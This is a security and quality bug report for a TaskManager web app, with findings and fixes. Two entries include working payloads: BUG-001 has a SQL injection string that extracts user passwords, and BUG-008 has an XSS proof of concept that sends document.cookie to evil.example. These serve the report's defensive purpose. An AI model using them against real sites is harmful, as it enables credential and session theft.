# Bugs & Issues Report — TaskManager App

**Project:** TaskManager (React / Node.js / TypeScript / PostgreSQL)  
**Review date:** 2026-09-30  
**Reporters:** QA Team · Code Reviewers (Security, Performance, Frontend, Backend)

---

## Severity summary

| Severity | Count |
|----------|------:|
| Critical | 5 |
| High | 10 |
| Medium | 13 |
| Low | 7 |
| **Total** | **35** |

---

## Critical

---

### BUG-001 — SQL Injection in user search
- **File:** `server/src/routes/users.ts:11`
- **Reporter:** Code Reviewer — Security
- **Category:** Security
- **Description:** The `q` query parameter is interpolated directly into a SQL
  string using template literals. An attacker can break out of the LIKE clause
  and execute arbitrary SQL — read every table, drop the schema, or extract
  passwords.
- **Reproduction:**
  ```
  GET /api/users/search?q=' UNION SELECT id,email,password,name,created_at FROM users--
  ```
- **Expected:** Only rows whose `name` matches the search term are returned.
- **Actual:** All user rows including passwords are returned.
- **Fix:** Replace string interpolation with a parameterized query:
  ```ts
  pool.query("SELECT id, name, email FROM users WHERE name ILIKE $1", [`%${q}%`])
  ```

---

### BUG-002 — Hardcoded JWT secret / no token expiry
- **File:** `server/src/middleware/auth.ts:7,20`
- **Reporter:** Code Reviewer — Security
- **Category:** Security
- **Description:** The JWT signing secret `"supersecret123"` is committed to
  source code. Anyone with repository access can forge valid tokens for any
  user ID. Additionally, tokens are issued with no expiry (`expiresIn` is
  missing), so a stolen token is valid forever.
- **Fix:**
  ```ts
  const JWT_SECRET = process.env.JWT_SECRET;
  if (!JWT_SECRET) throw new Error('JWT_SECRET env var is required');
  // ...
  jwt.sign(payload, JWT_SECRET, { expiresIn: '15m' });
  ```

---

### BUG-003 — Passwords stored and compared in plain text
- **File:** `server/src/routes/users.ts:33,52`
- **Reporter:** Code Reviewer — Security
- **Category:** Security
- **Description:** User passwords are inserted into the database without
  hashing. The login route then compares plain text directly in SQL. A database
  breach immediately exposes every user's real password.
- **Fix:** Hash on register with `bcrypt.hash(password, 12)`, compare on login
  with `bcrypt.compare(plainText, storedHash)`. Never store or query raw
  passwords.

---

### BUG-004 — DELETE endpoints require no authentication
- **File:** `server/src/routes/users.ts:84` · `server/src/routes/tasks.ts:74`
- **Reporter:** QA — Functional Testing
- **Category:** Security
- **Reproduction:**
  ```
  DELETE /api/users/42        # no Authorization header
  DELETE /api/tasks/99        # no Authorization header
  ```
- **Expected:** 401 Unauthorized.
- **Actual:** Record is deleted successfully.
- **Fix:** Add `authenticate` middleware to both DELETE routes.

---

### BUG-008 — Stored XSS via `dangerouslySetInnerHTML`
- **File:** `client/src/components/TaskList.tsx:57` · `client/src/components/LoginForm.tsx:31`
- **Reporter:** Code Reviewer — Security
- **Category:** Security (XSS)
- **Description:** Task descriptions are rendered with `dangerouslySetInnerHTML`.
  Because tasks are created by users, anyone who saves a task with a script
  payload causes it to execute in every viewer's browser. The LoginForm makes
  the same mistake for error messages.
- **Proof of concept task description:**
  ```html
  <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
  ```
- **Fix:** Render user content as plain text: `<p>{task.description}</p>`.
  If rich text is a requirement, use a sanitisation library (DOMPurify).

---

## High

---

### BUG-005 — Insecure Direct Object Reference (IDOR) on task update
- **File:** `server/src/routes/tasks.ts:57`
- **Reporter:** QA — Security / Penetration Test
- **Category:** Security
- **Description:** The PUT `/api/tasks/:id` route updates whichever task has
  that `id` without checking whether the authenticated user owns it. Any
  logged-in user can overwrite another user's task.
- **Reproduction:** Log in as User A. Capture the task ID of User B via the
  search or any leaked ID. `PUT /api/tasks/<B's id>` with your token.
- **Fix:** Add `AND user_id = $6` to the UPDATE WHERE clause, passing
  `req.user.userId`.

---

### BUG-006 — Stack trace exposed in error responses
- **File:** `server/src/index.ts:24`
- **Reporter:** Code Reviewer — Security
- **Category:** Security / Information Disclosure
- **Description:** The global error handler sends `err.stack` to the client.
  Stack traces reveal internal file paths, library versions, and logic that
  help an attacker map the application.
- **Fix:**
  ```ts
  res.status(500).json({
    error: process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message,
  });
  ```

---

### BUG-007 — CORS misconfiguration (`origin: '*'` with `credentials: true`)
- **File:** `server/src/index.ts:14`
- **Reporter:** Code Reviewer — Security
- **Category:** Security
- **Description:** `credentials: true` combined with `origin: '*'` is rejected
  by browsers per the CORS spec (the spec forbids wildcard + credentials). Even
  when "working" via some clients, allowing all origins on an authenticated API
  is dangerous. Any website can make credentialed requests to this server.
- **Fix:** Explicitly whitelist allowed origins from `process.env.ALLOWED_ORIGINS`.

---

### BUG-009 — N+1 query on task list
- **File:** `server/src/routes/tasks.ts:18-24`
- **Reporter:** Code Reviewer — Performance
- **Category:** Performance
- **Description:** The route fetches all tasks in one query, then executes one
  additional query per task to fetch the assignee. For a user with 200 tasks
  this is 201 database round-trips. Under load this saturates the connection
  pool and causes cascading timeouts.
- **Fix:** Use a JOIN:
  ```sql
  SELECT t.*, u.name AS assignee_name, u.email AS assignee_email
    FROM tasks t
    LEFT JOIN users u ON u.id = t.assignee_id
   WHERE t.user_id = $1
  ```

---

### BUG-010 — Missing database transaction on task creation
- **File:** `server/src/routes/tasks.ts:43-52`
- **Reporter:** Code Reviewer — Backend
- **Category:** Data Integrity
- **Description:** A task row is inserted and then an audit row is inserted in
  two separate statements with no wrapping transaction. If the second insert
  fails (e.g. a constraint violation or timeout), the database is left with a
  task that has no audit record. Over time the audit table silently diverges
  from reality.
- **Fix:** Wrap both inserts in `BEGIN` / `COMMIT` / `ROLLBACK`.

---

### BUG-011 — Race condition and missing cleanup in `useTasks` fetch
- **File:** `client/src/hooks/useTasks.ts:16`
- **Reporter:** Code Reviewer — Frontend
- **Category:** React / State Management
- **Description:** The `useEffect` that fetches tasks has no cleanup function
  and no `AbortController`. Two consequences:
  1. If `userId` changes quickly, both fetches resolve and the slower
     (older) response can overwrite the newer one with stale data.
  2. If the component unmounts while a request is in-flight, `setTasks` is
     called on an unmounted component, producing a React warning and a
     potential memory leak.
- **Fix:**
  ```ts
  useEffect(() => {
    const controller = new AbortController();
    setLoading(true);
    api.getTasks({ signal: controller.signal })
      .then(setTasks)
      .catch(err => { if (err.name !== 'AbortError') setError(err.message); })
      .finally(() => setLoading(false));
    return () => controller.abort();
  }, [userId]);
  ```

---

### BUG-012 — Infinite render loop in `TaskForm`
- **File:** `client/src/components/TaskForm.tsx:24`
- **Reporter:** QA — Functional Testing
- **Category:** React / Hooks
- **Description:** `formData` is included in the `useEffect` dependency array.
  The effect body calls `setFormData`, which creates a new `formData`
  reference, which triggers the effect again — infinitely. This freezes the
  browser tab.
- **Reproduction:** Mount `<TaskForm currentUserId={1} onTaskCreated={…} />`.
  Open DevTools; CPU will spike to 100% immediately.
- **Fix:** Change the dependency array to `[currentUserId]` only.

---

### BUG-013 — Direct state mutation in three places
- **File:** `client/src/hooks/useTasks.ts:40,49` · `client/src/components/TaskList.tsx:43`
- **Reporter:** Code Reviewer — Frontend
- **Category:** React / State Management
- **Description:**
  - `useTasks.deleteTask`: `splice` is called on the state array itself. React
    receives the same array reference and may skip re-rendering.
  - `useTasks.completeTask`: A property on a state object is mutated in-place.
  - `TaskList.handleSelectAll`: `push` is called on the state array.
  In all three cases the UI can go out of sync with internal state.
- **Fix:** Always produce new references:
  ```ts
  setTasks(prev => prev.filter(t => t.id !== id));   // delete
  setTasks(prev => prev.map(t => t.id === id ? { ...t, status: 'completed' } : t)); // complete
  setSelectedIds(prev => [...prev, ...tasks.map(t => t.id)]); // select all
  ```

---

### BUG-019 — Password / sensitive fields returned in API responses
- **File:** `server/src/routes/users.ts:39,58,70`
- **Reporter:** QA — Security
- **Category:** Security / Information Disclosure
- **Description:** Every route that queries the `users` table uses `SELECT *`
  and returns `result.rows[0]` directly. This means the `password` column
  (plain text — see BUG-003) is present in every response: register, login,
  and get-by-id. The client types even declare `password?: string`, normalising
  its presence in the UI layer.
- **Fix:** Explicitly select only safe columns:
  ```sql
  SELECT id, name, email, created_at FROM users WHERE …
  ```

---

### BUG-025 — Missing `await` on audit insert (floating promise)
- **File:** `server/src/routes/tasks.ts:50`
- **Reporter:** Code Reviewer — Backend
- **Category:** Logic / Async
- **Description:** `pool.query(…)` on the audit insert is called without
  `await`. The returned Promise is never handled. Two consequences:
  1. Errors thrown by the insert are silently swallowed.
  2. The insert may not complete before the response is sent (or may not
     complete at all if the process is shut down shortly after).
- **Fix:** `await pool.query(…)` inside the transaction (see BUG-010).

---

## Medium

---

### BUG-014 — Array index used as React list key
- **File:** `client/src/components/TaskList.tsx:54`
- **Reporter:** Code Reviewer — Frontend
- **Category:** React
- **Description:** `key={index}` causes React to reuse DOM nodes based on
  position. When a task is deleted from the middle of the list, every item
  below it gets the wrong state — checkboxes, inputs, and animations will
  appear on the wrong task.
- **Fix:** `key={task.id}` — use the stable, unique server-assigned ID.

---

### BUG-015 — Memory leaks: event listeners and intervals not cleaned up
- **File:** `client/src/components/TaskList.tsx:30` · `client/src/components/UserProfile.tsx:19`
- **Reporter:** Code Reviewer — Frontend
- **Category:** React / Memory
- **Description:**
  - `TaskList`: a `resize` listener is added on mount but never removed. Each
    time the component mounts, a new listener is added.
  - `UserProfile`: a `setInterval` polls the API every 5 seconds but is never
    cleared. When `userId` changes or the component unmounts, the old interval
    keeps running, sending requests with the stale `userId`.
- **Fix:** Return a cleanup function from each `useEffect`:
  ```ts
  return () => window.removeEventListener('resize', handleResize);
  return () => clearInterval(pollInterval);
  ```

---

### BUG-016 — Stale closure captures initial empty `tasks` array
- **File:** `client/src/hooks/useTasks.ts:28`
- **Reporter:** Code Reviewer — Frontend
- **Category:** React / Hooks
- **Description:** The `visibilitychange` handler closes over `tasks` from the
  first render. The dependency array is `[]`, so the handler is only created
  once and always logs `0` regardless of how many tasks have loaded. This is
  the classic stale-closure trap.
- **Fix:** Either add `tasks` to the dependency array (which requires
  `useCallback` to stabilise the function reference) or use a `useRef` to
  always access the latest value without re-registering the listener.

---

### BUG-017 — Async route handlers missing try/catch
- **File:** `server/src/routes/users.ts:11,67`
- **Reporter:** Code Reviewer — Backend
- **Category:** Error Handling
- **Description:** The `/search` and `GET /:id` routes are `async` functions
  but have no `try/catch`. Any thrown error becomes an unhandled promise
  rejection. In Node ≥ 15 this terminates the process; in earlier versions it
  silently hangs the HTTP response.
- **Fix:** Wrap in try/catch, or use an `asyncHandler` wrapper.

---

### BUG-018 — Wrong HTTP status on resource creation
- **File:** `server/src/routes/users.ts:39`
- **Reporter:** Code Reviewer — API Design
- **Category:** API Design
- **Description:** `POST /api/users/register` returns `200 OK` instead of
  `201 Created`. REST conventions and client libraries that rely on status
  codes for cache invalidation or redirect behaviour will behave incorrectly.
- **Fix:** `res.status(201).json(…)`

---

### BUG-020 — No pagination on task list endpoint
- **File:** `server/src/routes/tasks.ts:15`
- **Reporter:** QA — Performance / Load Testing
- **Category:** Performance
- **Description:** `GET /api/tasks` fetches every task belonging to the user
  with no `LIMIT` or `OFFSET`. A power user with thousands of tasks will
  receive a multi-megabyte response, overwhelming the client and holding a
  database connection for an extended time.
- **Fix:** Accept `page` and `pageSize` query params; default `pageSize` to 50.

---

### BUG-022 — Overuse of `any` type across the codebase
- **Files:** `client/src/types.ts:17` · `client/src/api/client.ts:17` ·
  `server/src/middleware/auth.ts:10` · `client/src/components/LoginForm.tsx:6`
  · multiple other locations
- **Reporter:** Code Reviewer — TypeScript
- **Category:** TypeScript / Type Safety
- **Description:** `any` is used for request objects, API responses, event
  handlers, and callback parameters. This erases TypeScript's guarantees and
  makes bugs invisible to the compiler. Key examples:
  - `request()` returns `Promise<any>` — callers cannot know the shape.
  - `req: any` in `authenticate` — type safety is lost for all downstream
    middleware that reads `req.user`.
  - `err: any` in catch blocks — should be `unknown` with a type guard.
- **Fix:** Define proper interfaces; extend Express `Request` with a custom
  type declaration; use `unknown` in catch blocks.

---

### BUG-023 — Non-null assertions used without null guards
- **File:** `server/src/routes/tasks.ts:43` · `client/src/components/UserProfile.tsx:28` · `client/src/App.tsx:12`
- **Reporter:** Code Reviewer — TypeScript
- **Category:** TypeScript / Runtime Safety
- **Description:** `req.user!.userId` and `user!.name` assert non-null without
  verifying the value first. If `authenticate` fails to attach `user`, or if
  the API returns null, these throw `TypeError: Cannot read properties of null`
  at runtime — the exact scenario TypeScript's strict null checks are meant to
  prevent.
- **Fix:** Add explicit null checks or early-return guards before accessing
  the value.

---

### BUG-024 — Loose equality operator (`==` / `!=`) for string comparison
- **File:** `server/src/routes/tasks.ts:60` · `client/src/components/TaskList.tsx:47`
- **Reporter:** Code Reviewer — Code Quality
- **Category:** Logic
- **Description:** `==` / `!=` with strings triggers JavaScript's type
  coercion rules. While the current code happens to work, it is misleading
  and could silently break if `status` becomes a numeric enum or changes type.
  TypeScript's `strict` mode does not catch this.
- **Fix:** Use `===` / `!==` throughout.

---

### BUG-028 — No input validation on any endpoint
- **Files:** `server/src/routes/users.ts` · `server/src/routes/tasks.ts`
- **Reporter:** Code Reviewer — Security / Backend
- **Category:** Input Validation
- **Description:** No route validates that required fields are present,
  non-empty, within length limits, or the correct type. Consequences include:
  - Creating users/tasks with null or empty titles.
  - Storing a 1 MB description and crashing the response pipeline.
  - `assigneeId` being a non-numeric string passed directly to PostgreSQL.
- **Fix:** Use a validation library (Zod, Joi) at the route level and return
  `400 Bad Request` with a descriptive message when validation fails.

---

### BUG-035 — `async` function passed directly to `useEffect`
- **File:** `client/src/components/TaskList.tsx:36`
- **Reporter:** Code Reviewer — Frontend
- **Category:** React / Hooks
- **Description:** An async function returns a Promise; `useEffect` expects
  either nothing or a cleanup function. React silently ignores the Promise,
  meaning:
  1. The cleanup mechanism is broken (no way to abort the fetch).
  2. The ESLint rule `react-hooks/exhaustive-deps` flags this pattern.
- **Fix:** Define the async logic inside the effect, not as the effect itself:
  ```ts
  useEffect(() => {
    let cancelled = false;
    (async () => {
      const data = await fetch('/api/tasks/stats').then(r => r.json());
      if (!cancelled) setStats(data);
    })();
    return () => { cancelled = true; };
  }, [tasks]);
  ```

---

## Low

---

### BUG-021 — `SELECT *` in all database queries
- **Files:** `server/src/routes/users.ts:12,68` · `server/src/routes/tasks.ts:16`
- **Reporter:** Code Reviewer — Performance
- **Category:** Performance / Code Quality
- **Description:** `SELECT *` fetches every column including `password`,
  `created_at`, `updated_at`. This wastes bandwidth and network buffers, and
  risks accidentally exposing new columns added to the table in future
  migrations.
- **Fix:** Always enumerate the columns you actually need.

---

### BUG-026 — JWT and user object stored in `localStorage`
- **File:** `client/src/api/client.ts:7` · `client/src/components/LoginForm.tsx:38` · `client/src/App.tsx:26`
- **Reporter:** Code Reviewer — Security
- **Category:** Security (low-medium depending on threat model)
- **Description:** `localStorage` is accessible to any JavaScript on the
  page. A single XSS vulnerability anywhere on the domain lets an attacker
  steal the token and impersonate the user. The full user object (potentially
  including a password hash — see BUG-019) is also stored there.
- **Fix:** Use `httpOnly` / `Secure` cookies set by the server so the token
  is never accessible to JavaScript.

---

### BUG-027 — Inline object literal as default prop causes unnecessary re-renders
- **File:** `client/src/App.tsx:40` · `client/src/components/TaskList.tsx:12`
- **Reporter:** Code Reviewer — Performance
- **Category:** Performance / React
- **Description:** `filters={{ status: 'pending' }}` and
  `filters = {}` (default parameter) both create a new object reference on
  every render. Any child component or hook that does a referential comparison
  (e.g. `React.memo`, `useEffect` deps) will see a changed value even when
  the data is identical.
- **Fix:** Define the constant outside the component, or wrap with `useMemo`.

---

### BUG-029 — `console.log` statements left in production code
- **Files:** `server/src/routes/users.ts:72` · `server/src/routes/tasks.ts:92` · `client/src/components/LoginForm.tsx:41`
- **Reporter:** Code Reviewer — Code Quality
- **Category:** Code Quality / Security
- **Description:** Several `console.log` calls output user IDs, request
  bodies (which may contain passwords), and stats objects. In production these
  appear in server logs that may be shipped to an external logging service,
  potentially exposing PII.
- **Fix:** Remove debug logs; use a structured logger (e.g. `pino`) with
  appropriate log levels, ensuring sensitive fields are redacted.

---

### BUG-030 — Magic numbers without named constants
- **File:** `server/src/routes/tasks.ts:87` · `client/src/components/LoginForm.tsx:52`
- **Reporter:** Code Reviewer — Code Quality
- **Category:** Code Quality
- **Description:** The number `70` in the stats route (the "on-track" threshold)
  and `8` (minimum password length) are not explained. A future developer
  cannot tell whether these values are business rules, technical limits, or
  arbitrary.
- **Fix:**
  ```ts
  const ON_TRACK_THRESHOLD_PERCENT = 70;
  const MIN_PASSWORD_LENGTH = 8;
  ```

---

### BUG-032 — Dead code: unused `oldFetchTasksForUser` function
- **File:** `server/src/routes/tasks.ts:100`
- **Reporter:** Code Reviewer — Code Quality
- **Category:** Code Quality
- **Description:** A function `oldFetchTasksForUser` remains in the file but
  is never called. This is likely a leftover from an earlier refactor. Dead
  code increases cognitive load, confuses new contributors, and may be
  mistakenly revived.
- **Fix:** Delete it. Git history preserves the old implementation if it is
  ever needed again.

---

### BUG-033 — Missing indexes on frequently queried columns
- **File:** `server/src/db/schema.sql`
- **Reporter:** Code Reviewer — Database / Performance
- **Category:** Performance
- **Description:** The `tasks` table has no indexes on `user_id`,
  `assignee_id`, `status`, or `due_date`. Every `WHERE user_id = $1` query
  (which runs on every page load) performs a sequential scan. At a few hundred
  rows this is imperceptible; at tens of thousands of rows latency becomes
  unacceptable.
- **Fix:**
  ```sql
  CREATE INDEX idx_tasks_user_id     ON tasks(user_id);
  CREATE INDEX idx_tasks_assignee_id ON tasks(assignee_id);
  CREATE INDEX idx_tasks_status      ON tasks(status);
  CREATE INDEX idx_tasks_due_date    ON tasks(due_date);
  ```

---

### BUG-034 — Inline arrow functions as props defeat `React.memo`
- **File:** `client/src/components/TaskList.tsx:64-65`
- **Reporter:** Code Reviewer — Performance
- **Category:** Performance / React
- **Description:** `onClick={() => onComplete(task.id)}` creates a new
  function reference on every render of `TaskList`. If the list items were
  wrapped in `React.memo`, they would still re-render on every parent render
  because the callback prop changed.
- **Fix:** Wrap `onComplete` and `onDelete` with `useCallback` in the parent,
  or accept `task` as a prop and call the handler from inside the item
  component so the closure doesn't capture `task.id` from the map.

---

*Happy bug hunting. Fix them one by one and verify with tests.*
